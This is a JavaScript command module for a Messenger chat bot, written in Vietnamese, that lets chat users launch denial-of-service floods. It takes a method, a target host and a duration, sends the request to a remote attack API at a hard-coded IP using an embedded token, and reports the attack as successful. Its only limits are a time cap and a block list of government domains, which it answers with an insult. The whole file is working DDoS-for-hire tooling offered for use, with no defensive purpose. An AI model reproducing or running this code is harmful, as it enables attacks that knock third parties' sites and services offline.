module.exports.config = {
  name: "sent",
  version: "2.3.0",
  hasPermssion: 0,
  credits: "nvh",
  description: "Sent attack",
  commandCategory: "Khác",
  usages: "[method] [host] [time]",
  cooldowns: 30,
  usePrefix: true
};

const ADMIN_IDS = ["100073639420918", "100058313270528"];
const ADMIN_MAX_TIME = 120;
const USER_MAX_TIME = 60;
const API_TOKEN = "forkyyy_api_2025";
const AVAILABLE_METHODS = ['h2', 'vip', 'flood', 'raw', 'clf'];

// danh sách từ khóa cấm
const BLOCKED_KEYWORDS = [
  "gov.vn",
  "bocongan",
  "moha.gov.vn",
  "mps.gov.vn",
  "chinhphu.vn"
];

module.exports.run = async function({ api, event, args }) {
  const axios = require('axios');
  const { threadID, messageID, senderID } = event;
  let [method, host, time] = args;

  if (!method || !host || !time) {
    return api.sendMessage(
      `❌ Thiếu tham số\n\n📖 Hướng dẫn:\n.sent [method] [host] [time]\n\n📌 Ví dụ:\n.sent vip dungkon.fun 30\n\n📍 Các method:\n- ${AVAILABLE_METHODS.join('\n- ')}`,
      threadID, messageID
    );
  }

  method = method.toLowerCase();
  if (!AVAILABLE_METHODS.includes(method)) {
    return api.sendMessage(`❌ Method "${method}" không hợp lệ.\n✅ Các method hợp lệ: ${AVAILABLE_METHODS.join(', ')}`, threadID, messageID);
  }

  if (!host.includes(".")) {
    return api.sendMessage("❌ Host không hợp lệ, vui lòng nhập domain hoặc IP hợp lệ!", threadID, messageID);
  }

  // check từ khóa cấm
  if (BLOCKED_KEYWORDS.some(kw => host.includes(kw))) {
    return api.sendMessage("ddos con mẹ mày à", threadID, messageID);
  }

  const isAdmin = ADMIN_IDS.includes(senderID);
  const maxTime = isAdmin ? ADMIN_MAX_TIME : USER_MAX_TIME;
  time = parseInt(time);
  if (isNaN(time) || time <= 0 || time > maxTime) {
    return api.sendMessage(`❌ Thời gian không hợp lệ. Max: ${maxTime} giây.`, threadID, messageID);
  }

  const threads = 100;
  const rate = 10;
  const apiUrl = `http://68.183.178.90:3000/api/attack?host=${host}&time=${time}&method=${method.toUpperCase()}&threads=${threads}&rate=${rate}&token=${API_TOKEN}`;

  const start = Date.now();

  try {
    const res = await axios.get(apiUrl);
    const elapsed = (Date.now() - start) / 1000; // tính giây

    if (res.data && res.data.message) {
      const successMsg = `✅ Tấn công thành công!\n\n` +
        `🔗 Host: ${host.startsWith("http") ? host : "https://" + host}\n` +
        `⏱️ Thời gian: ${time} giây\n` +
        `⚙️ Phương thức: ${method.toUpperCase()}\n` +
        `⏳ Thời gian xử lý: ${elapsed.toFixed(2)}s\n` +
        `🔗 Check status tại: https://check-host.net/check-http?host=${host}`;

      return api.sendMessage(successMsg, threadID, messageID);
    } else {
      return api.sendMessage("⚠️ Gửi yêu cầu thất bại, API không phản hồi!", threadID, messageID);
    }
  } catch (err) {
    console.error(err);
    return api.sendMessage("❌ API lỗi hoặc TOKEN sai/hết hạn!", threadID, messageID);
  }
};